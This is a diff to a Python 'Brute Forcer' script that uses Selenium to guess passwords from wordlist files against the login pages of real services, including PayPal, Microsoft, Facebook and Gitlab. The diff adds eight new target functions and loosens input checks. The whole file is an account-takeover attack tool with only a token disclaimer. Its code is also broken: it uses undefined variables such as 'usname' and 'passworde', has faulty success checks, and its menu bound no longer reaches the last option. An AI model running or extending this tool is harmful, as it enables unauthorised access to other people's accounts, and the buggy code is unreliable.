@@ -1,8 +1,8 @@
 """
 Author: @new92
-Brute Forcer: Program for Brute Forcing Instagram Accounts
+Brute Forcer: Program for Brute Forcing Accounts
 Please do not use it for illegal purposes !
-The author is not responsible for any illegal activity/activities carried out using this program !!
+The author's not responsible for any illegal activity/activities carried out using this program !!
 The author's not responsible for any damages may be caused in the given account(s).
 """
 #Imports
@@ -10,7 +10,6 @@ try:
     import time
     import platform
     from os import system
-    from datetime import time
     import sniffer
     import socket
     import http
@@ -81,7 +80,15 @@ def AvailAttacks():
     print("[20] IG Followers")
     print("[21] FIFA")
     print("[22] Zoom")
-    print("[23] Pornhub")
+    print("[23] W3Schools")
+    print("[24] Leetcode")
+    print("[25] Geeks for Geeks")
+    print("[26] Flickr")
+    print("[27] Fiverr")
+    print("[28] Gitlab")
+    print("[29] FreeLancer")
+    print("[30] Microsoft")
+    print("[31] Pornhub")
 
 #Instagram
 def Instagram():
@@ -150,7 +157,7 @@ def Facebook():
     browser = webdriver.Firefox()
     browser.get("https://www.facebook.com/login")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("pass")
+    passcode = browser.find_element_by_id("pass")
     login = browser.find_element_by_id("loginbutton")
     login.click()
     Found = False
@@ -164,7 +171,7 @@ def Facebook():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -204,7 +211,7 @@ def Messenger():
     browser = webdriver.Firefox()
     browser.get("https://www.messenger.com/login")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("pass")
+    passcode = browser.find_element_by_id("pass")
     login = browser.find_element_by_id("loginbutton")
     login.click()
     Found = False
@@ -218,7 +225,7 @@ def Messenger():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -276,7 +283,7 @@ def Gmail():
                 Found = True
                 print("[!] Password Found: "+str(Found))
                 time.sleep(1)
-                print("[+] Password: "+str(password))
+                print("[+] Password: "+str(passworde))
                 exit(0)
             else:
                 continue
@@ -308,7 +315,7 @@ def Reddit():
     browser = webdriver.Firefox()
     browser.get("https://www.reddit.com/login/")
     username = browser.find_element_by_id("loginUsername")
-    password = browser.find_element_by_id("loginPassword")
+    passcode = browser.find_element_by_id("loginPassword")
     login = browser.find_element_by_class_name("AnimatedForm__submitButton m-full-width")
     login.click()
     Found = False
@@ -322,7 +329,7 @@ def Reddit():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -363,7 +370,7 @@ def TikTok():
     browser = webdriver.Firefox()
     browser.get("https://www.tiktok.com/login/phone-or-email/email")
     username = browser.find_element_by_name("username")
-    password = browser.find_element_by_class_name("tiktok-4k039c-InputContainer etcs7ny1")
+    passcode = browser.find_element_by_class_name("tiktok-4k039c-InputContainer etcs7ny1")
     login = browser.find_element_by_class_name("e1w6iovg0 tiktok-15aypwy-Button-StyledButton ehk74z00")
     login.click()
     Found = False
@@ -377,7 +384,7 @@ def TikTok():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -418,7 +425,7 @@ def Netflix():
     browser = webdriver.Firefox()
     browser.get("https://www.netflix.com/login")
     username = browser.find_element_by_id("id_userLoginId")
-    password = browser.find_element_by_id("id_password")
+    passcode = browser.find_element_by_id("id_password")
     login = browser.find_element_by_class_name("btn login-button btn-submit btn-small")
     login.click()
     Found = False
@@ -432,7 +439,7 @@ def Netflix():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -473,7 +480,7 @@ def Pinterest():
     browser = webdriver.Firefox()
     browser.get("https://pinterest.com/login")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_class_name("zI7 iyn Hsu")
     login.click()
     Found = False
@@ -487,7 +494,7 @@ def Pinterest():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -528,7 +535,7 @@ def LinkedIn():
     browser = webdriver.Firefox()
     browser.get("https://www.linkedin.com/login")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_class_name("btn__primary--large from__button--floating")
     login.click()
     Found = False
@@ -542,7 +549,7 @@ def LinkedIn():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -583,7 +590,7 @@ def Paypal():
     browser = webdriver.Firefox()
     browser.get("https://www.paypal.com/signin")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_id("btnLogin")
     login.click()
     Found = False
@@ -597,7 +604,7 @@ def Paypal():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -638,7 +645,7 @@ def Snapchat():
     browser = webdriver.Firefox()
     browser.get("https://accounts.snapchat.com/accounts/login")
     username = browser.find_element_by_id("username")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_id("loginTrigger")
     login.click()
     Found = False
@@ -652,7 +659,7 @@ def Snapchat():
             password = content
             try:
                 username.send_keys(umail)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -693,7 +700,7 @@ def Spotify():
     browser = webdriver.Firefox()
     browser.get("https://accounts.spotify.com/login")
     username = browser.find_element_by_id("login-username")
-    password = browser.find_element_by_id("login-password")
+    passcode = browser.find_element_by_id("login-password")
     login = browser.find_element_by_class_name("Type__TypeElement-goli3j-0 dmuHFl sc-hKwDye eKDPqH")
     login.click()
     Found = False
@@ -707,7 +714,7 @@ def Spotify():
             password = content
             try:
                 username.send_keys(umail)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -748,7 +755,7 @@ def Twitch():
     browser = webdriver.Firefox()
     browser.get("https://www.twitch.tv/login")
     username = browser.find_element_by_id("login-username")
-    password = browser.find_element_by_id("password-input")
+    passcode = browser.find_element_by_id("password-input")
     login = browser.find_element_by_class_name("Layout-sc-nxg1ff-0 OZCSg")
     login.click()
     Found = False
@@ -762,7 +769,7 @@ def Twitch():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -803,7 +810,7 @@ def Steam():
     browser = webdriver.Firefox()
     browser.get("https://store.steampowered.com/login")
     username = browser.find_element_by_id("input_username")
-    password = browser.find_element_by_id("input_password")
+    passcode = browser.find_element_by_id("input_password")
     login = browser.find_element_by_id("login_btn_signin")
     login.click()
     Found = False
@@ -817,7 +824,7 @@ def Steam():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -858,7 +865,7 @@ def Badoo():
     browser = webdriver.Firefox()
     browser.get("https://badoo.com/signin")
     username = browser.find_element_by_id("signin-name")
-    password = browser.find_element_by_id("signin-password")
+    passcode = browser.find_element_by_id("signin-password")
     login = browser.find_element_by_id("signin-submit")
     login.click()
     Found = False
@@ -872,7 +879,7 @@ def Badoo():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -913,7 +920,7 @@ def Crypto():
     browser = webdriver.Firefox()
     browser.get("https://crypto.com/nft/login")
     username = browser.find_element_by_name("email")
-    password = browser.find_element_by_name("password")
+    passcode = browser.find_element_by_name("password")
     login = browser.find_element_by_class_name("css-yfvlpn Button_container__K9X6Y")
     login.click()
     Found = False
@@ -927,7 +934,7 @@ def Crypto():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -968,7 +975,7 @@ def DropBox():
     browser = webdriver.Firefox()
     browser.get("https://www.dropbox.com/login")
     username = browser.find_element_by_id("login_email4252885293303712")
-    password = browser.find_element_by_id("login_password8932165565851398")
+    passcode = browser.find_element_by_id("login_password8932165565851398")
     login = browser.find_element_by_class_name("login-button signin-button button-primary")
     login.click()
     Found = False
@@ -982,7 +989,7 @@ def DropBox():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1023,7 +1030,7 @@ def Oracle():
     browser = webdriver.Firefox()
     browser.get("https://login.oracle.com/mysso/signon.jsp")
     username = browser.find_element_by_id("sso_username")
-    password = browser.find_element_by_id("ssopassword")
+    passcode = browser.find_element_by_id("ssopassword")
     login = browser.find_element_by_id("signin_button")
     login.click()
     Found = False
@@ -1037,7 +1044,7 @@ def Oracle():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1067,7 +1074,7 @@ def StackOverFlow():
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
-    while email == None or len(email) > 30 or "@" not in email:
+    while email == None or "@" not in email:
         time.sleep(1)
         print("[!] Invalid Email !")
         time.sleep(1)
@@ -1078,7 +1085,7 @@ def StackOverFlow():
     browser = webdriver.Firefox()
     browser.get("https://stackoverflow.com/users/login")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_id("submit-button")
     login.click()
     Found = False
@@ -1092,7 +1099,7 @@ def StackOverFlow():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1133,7 +1140,7 @@ def IGF():
     browser = webdriver.Firefox()
     browser.get("https://igfollower.net/girisyap")
     username = browser.find_element_by_id("username")
-    password = browser.find_element_by_name("password")
+    passcode = browser.find_element_by_name("password")
     login = browser.find_element_by_id("login_insta")
     login.click()
     Found = False
@@ -1147,7 +1154,7 @@ def IGF():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1177,7 +1184,7 @@ def FIFA():
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
-    while email == None or len(email) > 30 or "@" not in email:
+    while email == None or "@" not in email:
         time.sleep(1)
         print("[!] Invalid Email !")
         time.sleep(1)
@@ -1187,7 +1194,7 @@ def FIFA():
     browser = webdriver.Firefox()
     browser.get("https://account.fifa.com/5a7baeb7-e706-4830-ad9f-103eba126311/oauth2/v2.0/authorize?p=b2c_1a_fifa_signuporsignin&client_id=adfd65b0-8026-4baa-ac21-db631c2139ec&response_type=code&redirect_uri=https%3A%2F%2Fwww.fifa.com%2Fapi%2Fauth&scope=adfd65b0-8026-4baa-ac21-db631c2139ec&prompt=login&response_mode=form_post&state=&ui_locales=en")
     username = browser.find_element_by_id("signInName")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_id("next")
     login.click()
     Found = False
@@ -1201,7 +1208,7 @@ def FIFA():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1231,7 +1238,7 @@ def Zoom():
     time.sleep(2)
     email=input("[::] Please enter the Email: ")
     time.sleep(1)
-    while email == None or len(email) > 30 or "@" not in email:
+    while email == None or "@" not in email:
         time.sleep(1)
         print("[!] Invalid Email !")
         time.sleep(1)
@@ -1242,7 +1249,7 @@ def Zoom():
     browser = webdriver.Firefox()
     browser.get("https://zoom.us/signin")
     username = browser.find_element_by_id("email")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_class_name("btn btn-primary signin user")
     login.click()
     Found = False
@@ -1256,7 +1263,7 @@ def Zoom():
             password = content
             try:
                 username.send_keys(email)
-                password.send_keys(password)
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1297,7 +1304,7 @@ def Pornhub():
     browser = webdriver.Firefox()
     browser.get("https://www.pornhub.com/login")
     username = browser.find_element_by_id("username")
-    password = browser.find_element_by_id("password")
+    passcode = browser.find_element_by_id("password")
     login = browser.find_element_by_id("submit")
     login.click()
     Found = False
@@ -1311,7 +1318,457 @@ def Pornhub():
             password = content
             try:
                 username.send_keys(usname)
-                password.send_keys(password)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#W3Schools
+def W3Schools():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for W3Schools...")
+    time.sleep(2)
+    email=input("[::] Please enter the Email: ")
+    time.sleep(1)
+    while email == None or "@" not in email:
+        time.sleep(1)
+        print("[!] Invalid Email !")
+        time.sleep(1)
+        email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
+    email = email.lower()
+    email = email.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://profile.w3schools.com/log-in")
+    username = browser.find_element_by_id("modalusername")
+    passcode = browser.find_element_by_id("current-password")
+    login = browser.find_element_by_class_name("Button_button__URNp+ Button_primary__d2Jt3 Button_fullwidth__0HLEu")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(email)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#Leetcode
+def Leetcode():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Leetcode...")
+    time.sleep(2)
+    umail=input("[::] Please enter the Username or the Email: ")
+    time.sleep(1)
+    while umail == None:
+        time.sleep(1)
+        print("[!] Invalid Username or Email !")
+        time.sleep(1)
+        umail=input("[::] Please enter again the Username or the Email: ")
+    print("[!] Initiating Attack !")
+    umail = umail.lower()
+    umail = umail.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://leetcode.com/accounts/login/")
+    username = browser.find_element_by_id("id_login")
+    passcode = browser.find_element_by_id("id_password")
+    login = browser.find_element_by_class_name("btn-content-container__2HVS")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(umail)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#Geeks for Geeks
+def GFG():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Geeks for Geeks...")
+    time.sleep(2)
+    umail=input("[::] Please enter the Username or the Email: ")
+    time.sleep(1)
+    while umail == None:
+        time.sleep(1)
+        print("[!] Invalid Username or Email !")
+        time.sleep(1)
+        umail=input("[::] Please enter again the Username or the Email: ")
+    print("[!] Initiating Attack !")
+    umail = umail.lower()
+    umail = umail.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://auth.geeksforgeeks.org/")
+    username = browser.find_element_by_id("luser")
+    passcode = browser.find_element_by_id("password")
+    login = browser.find_element_by_class_name("btn btn-green signin-button")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(umail)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#FlickR
+def Flickr():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Flickr...")
+    time.sleep(2)
+    email=input("[::] Please enter the Email: ")
+    time.sleep(1)
+    while email == None or "@" not in email:
+        time.sleep(1)
+        print("[!] Invalid Email !")
+        time.sleep(1)
+        email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
+    email = email.lower()
+    email1 = email.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://identity.flickr.com/login")
+    try:
+        email = browser.find_element_by_id("login-email")
+        email.send_keys(email1)
+    except Exception as e:
+        pass
+    next = browser.find_element_by_class_name("mt-5 c-white bg-blue flickr-button flex align-center justify-center f-size-3 f-weight-bold over-y-hidden block w-100 b-rad-1 py-2 px-4")
+    next.click()
+    passcode = browser.find_element_by_id("login-password")
+    login = browser.find_element_by_class_name("user-select-none")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#Fiverr
+def Fiverr():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Fiverr...")
+    time.sleep(2)
+    umail=input("[::] Please enter the Username or the Email: ")
+    time.sleep(1)
+    while umail == None:
+        time.sleep(1)
+        print("[!] Invalid Username or Email !")
+        time.sleep(1)
+        umail=input("[::] Please enter again the Username or the Email: ")
+    print("[!] Initiating Attack !")
+    umail = umail.lower()
+    umail = umail.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://www.fiverr.com/login")
+    username = browser.find_element_by_id("login")
+    passcode = browser.find_element_by_id("password")
+    login = browser.find_element_by_class_name("ORLWF8p _0MkXbqi co-white submit-button bg-co-green-700")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(usname)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#Gitlab
+def Gitlab():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Gitlab...")
+    time.sleep(2)
+    umail=input("[::] Please enter the Username or the Email: ")
+    time.sleep(1)
+    while umail == None:
+        time.sleep(1)
+        print("[!] Invalid Username or Email !")
+        time.sleep(1)
+        umail=input("[::] Please enter again the Username or the Email: ")
+    print("[!] Initiating Attack !")
+    umail = umail.lower()
+    umail = umail.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://gitlab.com/users/sign_in/")
+    username = browser.find_element_by_id("user_login")
+    passcode = browser.find_element_by_id("user_password")
+    login = browser.find_element_by_class_name("gl-button btn btn-block btn-confirm js-sign-in-button js-no-auto-disable")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(usname)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#FreeLancer
+def Freelancer():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Freelancer...")
+    time.sleep(2)
+    umail=input("[::] Please enter the Username or the Email: ")
+    time.sleep(1)
+    while umail == None:
+        time.sleep(1)
+        print("[!] Invalid Username or Email !")
+        time.sleep(1)
+        umail=input("[::] Please enter again the Username or the Email: ")
+    print("[!] Initiating Attack !")
+    umail = umail.lower()
+    umail = umail.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://www.freelancer.com/login")
+    username = browser.find_element_by_id("emailOrUsernameInput")
+    passcode = browser.find_element_by_id("passwordInput")
+    login = browser.find_element_by_class_name("ButtonElement ng-star-inserted")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                username.send_keys(usname)
+                passcode.send_keys(password)
+            except Exception as e:
+                continue
+            if e == False:
+                time.sleep(1)
+                Found = True
+                print("[!] Password Found: "+str(Found))
+                time.sleep(1)
+                print("[+] Password: "+str(password))
+                exit(0)
+            else:
+                continue
+        if password not in "passwords"+str(i)+".txt":
+            time.sleep(1)
+            f.close()
+            print("[!] Password Found in File "+str(i)+": "+str(Found))
+            time.sleep(2)
+            print("[+] Continuing Brute Force with File "+str(i)+"...")
+            time.sleep(2)
+            continue
+        else:
+            continue
+
+#Microsoft
+def Microsoft():
+    time.sleep(1)
+    print("[+] Preparing Brute Force Attack for Microsoft...")
+    time.sleep(2)
+    email=input("[::] Please enter the Email: ")
+    time.sleep(1)
+    while email == None or "@" not in email:
+        time.sleep(1)
+        print("[!] Invalid Email !")
+        time.sleep(1)
+        email=input("[::] Please enter again the Email: ")
+    print("[!] Initiating Attack !")
+    email = email.lower()
+    email1 = email.strip()
+    browser = webdriver.Firefox()
+    browser.get("https://login.live.com/login.srf")
+    try:
+        email = browser.find_element_by_id("i0116")
+        email.send_keys(email1)
+    except Exception as e:
+        pass
+    next = browser.find_element_by_id("idSIButton9")
+    next.click()
+    passcode = browser.find_element_by_id("i0118")
+    login = browser.find_element_by_id("idSIButton9")
+    login.click()
+    Found = False
+    for i in range(16):
+        f = open("passwords"+str(i)+".txt","r",encoding="utf8")
+        f.seek(0)
+        lines=f.readlines()
+        for line in lines:
+            content=line[0:-1]
+            content=content.strip()
+            password = content
+            try:
+                passcode.send_keys(password)
             except Exception as e:
                 continue
             if e == False:
@@ -1359,7 +1816,7 @@ if option == "01" or option == "1":
     print("\n")
     attack = int(input("[::] Please enter the number of the attack: "))
     time.sleep(1)
-    while attack <= 0 or attack > 23 or attack == None:
+    while attack <= 0 or attack > 30 or attack == None:
         print("[!] Invalid Attack !")
         time.sleep(1)
         attack = int(input("[::] Please enter again the number of the attack: "))
@@ -1408,6 +1865,22 @@ if option == "01" or option == "1":
     elif attack == 22:
         Zoom()
     elif attack == 23:
+        W3Schools()
+    elif attack == 24:
+        Leetcode()
+    elif attack == 25:
+        GFG()
+    elif attack == 26:
+        Flickr()
+    elif attack == 27:
+        Fiverr()
+    elif attack == 28:
+        Gitlab()
+    elif attack == 29:
+        Freelancer()
+    elif attack == 30:
+        Microsoft()
+    elif attack == 31:
         Pornhub()
 else:
     print("Exiting...")
